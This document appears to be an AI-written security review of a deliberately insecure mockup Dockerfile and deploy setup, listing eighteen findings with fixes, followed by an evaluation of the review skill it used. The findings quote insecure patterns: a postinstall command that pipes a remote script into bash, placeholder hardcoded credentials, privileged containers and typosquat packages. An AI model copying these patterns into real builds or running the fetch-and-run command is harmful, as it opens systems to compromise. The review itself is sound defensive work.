# Security Review: 05-infra-deploy.dockerfile

**Reviewed file:** `/private/tmp/sec-context-mockups/05-infra-deploy.dockerfile`
**Date:** 2026-03-22
**Skill used:** sec-context (Arcanum Sec-Context, CC BY 4.0)

---

## Findings (18 vulnerabilities)

### CRITICAL (7)

#### 1. Hardcoded Secrets in ENV Directives
- **Lines:** 25-27
- **CWE:** CWE-798 (Hard-coded Credentials), CWE-259 (Hard-coded Password)
- **Pattern found:**
  ```dockerfile
  ENV ADMIN_USER=admin
  ENV ADMIN_PASSWORD=admin123
  ENV JWT_SECRET=super-secret-jwt-key-do-not-share
  ```
- **Risk:** These are visible via `docker inspect` and `docker history`. Anyone with image access gets the credentials.
- **Fix:** Remove from Dockerfile. Pass at runtime via Docker secrets, Vault, or `docker run -e` from a CI secret store.

#### 2. Hardcoded Tokens in Deploy Script
- **Lines:** 44-46
- **CWE:** CWE-798
- **Pattern found:**
  ```bash
  DEPLOY_TOKEN="ghp_a1b2c3d4e5f6g7h8i9j0klmnopqrstuv1234"
  SLACK_WEBHOOK="https://hooks.slack.com/services/T00000000/B00000000/XXXX..."
  DOCKERHUB_PASS="dckr_pat_abcdefghijk1234567890"
  ```
- **Risk:** Even commented out, this pattern teaches the wrong approach and risks accidental uncommenting. Tokens are in version history permanently.
- **Fix:** Source from CI secret stores (GitHub Actions secrets, Vault). Never place in source files.

#### 3. Running as Root
- **Line:** 35
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **Pattern found:** `USER root`
- **Risk:** Container escape vulnerabilities become full host compromise.
- **Fix:**
  ```dockerfile
  RUN addgroup --system app && adduser --system --ingroup app app
  USER app
  ```

#### 4. `--privileged` Flag in Deploy Script
- **Line:** 66
- **CWE:** CWE-250
- **Pattern found:** `docker run ... --privileged`
- **Risk:** Gives the container full host kernel capabilities, device access, and effectively root on the host.
- **Fix:** Remove `--privileged`. Use `--cap-add` for specific capabilities if absolutely needed.

#### 5. Remote Code Execution via Debug Port
- **Lines:** 37, 101
- **CWE:** CWE-215 (Information Exposure Through Debug Information)
- **Pattern found:** `--inspect=0.0.0.0:9229`
- **Risk:** Exposes the Node.js V8 debugger to all network interfaces. Allows unauthenticated remote code execution.
- **Fix:** Remove entirely for production. If needed locally, bind to `127.0.0.1`.

#### 6. Typosquatting / Malicious Packages
- **Lines:** 89-90, 92
- **CWE:** CWE-1357 (Hallucinated/Malicious Packages)
- **Packages flagged:**
  - `"colours"` -- typosquat of the legitimate `colors` package
  - `"requets"` -- typosquat of `requests` (Python package; doesn't exist legitimately on npm)
  - `"event-stream": "3.3.6"` -- this exact version was compromised (flatmap-stream incident) to steal cryptocurrency wallet keys
- **Fix:** Replace with correct package names. Remove `event-stream` or use a patched version.

#### 7. Arbitrary Code Execution in `postinstall`
- **Line:** 103
- **CWE:** CWE-829, CWE-494 (Download of Code Without Integrity Check)
- **Pattern found:** `"postinstall": "curl -s https://setup.example.com/init.sh | bash"`
- **Risk:** Downloads and executes a remote script with no integrity check. Classic supply chain attack vector.
- **Fix:** Remove. If external setup is needed, vendor the script and verify its hash.

---

### HIGH (7)

#### 8. Unpinned Base Image
- **Line:** 8
- **CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)
- **Pattern found:** `FROM node:latest`
- **Risk:** Non-deterministic builds. A compromised or breaking upstream tag silently changes the image.
- **Fix:** `FROM node:20.10.0-slim@sha256:<digest>`

#### 9. `COPY . .` Leaks Sensitive Files
- **Line:** 19
- **CWE:** CWE-200 (Excessive Data Exposure)
- **Pattern found:** `COPY . .`
- **Risk:** Copies `.env`, `.git`, `node_modules`, test fixtures, secrets, SSH keys into the image.
- **Fix:** Add a `.dockerignore` excluding `.env`, `.git`, `node_modules`, `tests`, etc. Use multi-stage builds.

#### 10. `NODE_ENV=development` and `DEBUG=*`
- **Lines:** 28-29
- **CWE:** CWE-215
- **Pattern found:**
  ```dockerfile
  ENV NODE_ENV=development
  ENV DEBUG=*
  ```
- **Risk:** Development mode enables verbose error messages, stack traces, and debug output in production.
- **Fix:** Set `NODE_ENV=production`. Remove `DEBUG=*`.

#### 11. `npm install` Without Lockfile
- **Line:** 22
- **CWE:** CWE-1104
- **Pattern found:** `RUN npm install`
- **Risk:** Resolves versions non-deterministically. Different builds get different (possibly compromised) versions.
- **Fix:** Commit `package-lock.json` and use `RUN npm ci`.

#### 12. Unpinned Dependency Versions
- **Lines:** 83-98
- **CWE:** CWE-1104
- **Packages flagged:**
  - `"express": "*"` -- any version
  - `"lodash": "latest"` -- always latest
  - `"bcrypt": ""` -- no version
  - `"mongoose": "^5.0.0"` -- wide range
- **Fix:** Pin exact versions. Use lockfiles.

#### 13. Known Vulnerable Package
- **Line:** 88
- **CWE:** CWE-1104
- **Pattern found:** `"serialize-javascript": "1.9.0"`
- **Risk:** Known XSS vulnerability (CVE-2019-16769).
- **Fix:** Update to `>=2.1.1`.

#### 14. Excessive Port Exposure
- **Lines:** 33, 63-65
- **CWE:** CWE-200
- **Pattern found:** `EXPOSE 3000 5432 6379 9229 27017`
- **Risk:** Exposes database ports (PostgreSQL 5432, Redis 6379, MongoDB 27017) and the debug port (9229). The deploy script also publishes `9229` and `5432` to the host.
- **Fix:** Only expose the application port (`3000`). Database and debug ports should never be accessible from outside.

---

### MEDIUM (4)

#### 15. Unnecessary Attack Surface -- Installed Packages
- **Lines:** 11-13
- **CWE:** CWE-1188 (Insecure Default Initialization)
- **Pattern found:** Installs `nmap`, `netcat`, `telnet`, `gcc`, `make`, `openssh-server`, `vim`, `nano`, `python3`
- **Risk:** Every extra binary is a tool for an attacker post-compromise.
- **Fix:** Use `node:20-slim` or distroless. Install only runtime dependencies.

#### 16. Unnecessary/Inappropriate Dependencies
- **Lines:** 93-98
- **CWE:** CWE-1104
- **Packages flagged:** `jquery`, `react`, `electron`, `puppeteer`, `aws-sdk` (full SDK instead of modular `@aws-sdk/client-*`)
- **Risk:** Unnecessary expansion of attack surface and dependency tree for a Node.js API service.
- **Fix:** Remove packages not needed for the API. Use modular AWS SDK v3 clients.

#### 17. Deprecated Package
- **Line:** 93
- **CWE:** CWE-1104
- **Pattern found:** `"node-uuid": "^1.4.0"`
- **Fix:** Replace with `uuid` (the maintained successor).

#### 18. Mutable `:latest` Tag for Deployment
- **Lines:** 55, 59
- **CWE:** CWE-494
- **Pattern found:** `docker push mycompany/api-service:latest` / `docker pull mycompany/api-service:latest`
- **Risk:** Mutable tags mean you can never be certain which version is running.
- **Fix:** Tag with immutable identifiers (git SHA, semver). Use digests for pulls.

---

## Summary Table

| Severity | Count | Key Themes |
|----------|-------|------------|
| Critical | 7 | Hardcoded secrets, root execution, RCE via debugger, supply chain (typosquats, compromised packages, curl-pipe-bash) |
| High | 7 | Unpinned base image, leaked files via COPY, dev mode in prod, no lockfile, excessive ports, known CVEs |
| Medium | 4 | Unnecessary tools/packages, deprecated deps, mutable tags |
| **Total** | **18** | |

---

## Priority Remediation Order

1. Remove hardcoded secrets (lines 25-27, 44-46) -- immediate credential rotation required
2. Drop `USER root` and `--privileged` -- switch to non-root user
3. Remove `--inspect=0.0.0.0:9229` -- closes RCE vector
4. Replace typosquat/compromised packages (`colours`, `requets`, `event-stream 3.3.6`)
5. Remove `postinstall` curl-pipe-bash
6. Pin base image, use `.dockerignore`, switch to `npm ci`
7. Set `NODE_ENV=production`, remove `DEBUG=*`
8. Reduce exposed ports to application port only
9. Pin all dependency versions, update vulnerable packages
10. Remove unnecessary OS packages and npm dependencies

---
---

# Skill Evaluation: sec-context

## Overview

The `sec-context` skill was used to perform this security review. This section evaluates its usefulness, the reference selection process, and overall effectiveness.

## Reference Selection Process

### Step 1: Surface Identification

The skill provides a routing table with trigger keywords for each security surface. I scanned the dockerfile content against these keywords:

| Surface | Trigger Keywords Matched | Source Lines |
|---------|-------------------------|--------------|
| **Secrets & Credentials** | `password`, `token`, `credential`, `env var` | 25-27, 44-46 (ENV directives, deploy tokens) |
| **Configuration & Deployment** | `debug`, `default credentials`, `admin` | 28-29, 35, 37, 66 (NODE_ENV, DEBUG, USER root, --privileged, EXPOSE) |
| **Dependencies & Supply Chain** | `package`, `dependency`, `npm`, `version`, `supply chain` | 22, 83-103 (npm install, package.json, postinstall) |

Other surfaces (XSS, injection, authentication, cryptography, file handling, API security) were not directly relevant to a Dockerfile/deploy-script/package.json review, so they were correctly excluded.

### Step 2: Breadth vs Depth Decision

The skill recommends loading breadth first, then depth only when the breadth coverage is insufficient. In this case:

- **Breadth was sufficient.** Every anti-pattern found in the file had a direct match in the breadth references (e.g., `secrets-breadth.md` section 1.1 covers hardcoded API keys; `dependencies-breadth.md` section 8.3 literally names `colours` and `requets` as typosquats; `config-deployment-breadth.md` section 7.7 covers unnecessary open ports and debug servers).
- **Depth was not needed.** The vulnerabilities were textbook cases, not edge cases requiring deeper analysis.

### Step 3: Reference Count

Three surfaces were loaded, which is within the skill's recommended maximum of 2-3 per task. This kept context manageable while covering all relevant attack vectors.

## What Worked Well

1. **Systematic surface routing** -- The trigger keyword table eliminated guesswork about which references to load. Instead of scanning all 10 surfaces, I matched keywords from the code and loaded exactly what was needed.

2. **BAD/GOOD pattern pairs** -- The pseudocode examples in each breadth file made it trivial to compare against the reviewed code. For example, `dependencies-breadth.md` section 8.3 lists `colours`, `requets`, and `electorn` as known typosquats -- two of these appeared verbatim in the file.

3. **CWE identifiers** -- Each reference section maps to specific CWEs, which I could attach directly to findings. This provides standardized severity classification and external traceability.

4. **Severity framework** -- The quick reference table at the top of the skill provides a consistent Critical/High/Medium ranking that I used to prioritize findings.

5. **Checklist as safety net** -- The Security Surface Identification Checklist at the end of the skill ensured I didn't overlook categories. For instance, I confirmed that file handling and API security were not in scope, rather than simply forgetting to check them.

6. **Progressive disclosure** -- The breadth-then-depth approach saved context. Loading all 10 breadth files plus 6 depth files would have consumed ~8,000 lines of reference material. Loading 3 breadth files consumed ~1,900 lines -- sufficient for this review.

## What Could Be Improved

1. **No Dockerfile-specific surface** -- The skill covers general deployment configuration but doesn't have a dedicated "Container Security" surface with patterns for `USER root`, `--privileged`, `COPY . .`, unpinned base images, multi-stage builds, etc. These patterns had to be caught from general knowledge + partial matches in `config-deployment-breadth.md` section 7.7.

2. **No `postinstall` / lifecycle script pattern** -- The dependencies breadth file covers typosquatting and version pinning well, but doesn't explicitly flag `postinstall` scripts that execute remote code. The finding was identified via the general CWE-829/CWE-494 references, but a specific BAD/GOOD example for npm lifecycle scripts would strengthen coverage.

3. **No explicit coverage of mutable image tags** -- The `:latest` tag anti-pattern in container registries is not covered. It's adjacent to the version pinning patterns in `dependencies-breadth.md` but not directly addressed.

## Verdict

**The skill was effective for this review.** It provided structured, actionable reference material that directly matched the majority of vulnerabilities present in the file. The routing system correctly narrowed 10 possible surfaces down to 3, and the breadth references were sufficient without needing depth files. The three gaps identified (container-specific patterns, lifecycle scripts, mutable image tags) are minor and were covered by general security knowledge.

**Rating: 4/5** -- Highly useful with minor gaps in container/infrastructure-specific patterns.
